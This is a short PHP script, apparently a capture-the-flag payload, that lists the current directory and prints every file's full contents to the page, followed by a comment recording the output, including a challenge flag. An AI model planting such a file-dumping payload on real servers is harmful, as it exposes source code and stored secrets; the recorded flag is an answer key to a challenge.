<?php

if ($handle = opendir("./")) {
    while ($entry = readdir($handle)) {
        if (!is_dir($entry)) {
            $contents = file_get_contents($entry);
            echo "File: $entry<br>Content: $contents<hr>";
        }
    }
    closedir($handle);
}

/* 
File: green2051ilt.php
Content: valentine{n3ver_g0nn4_give_y0u_up}
*/

?>
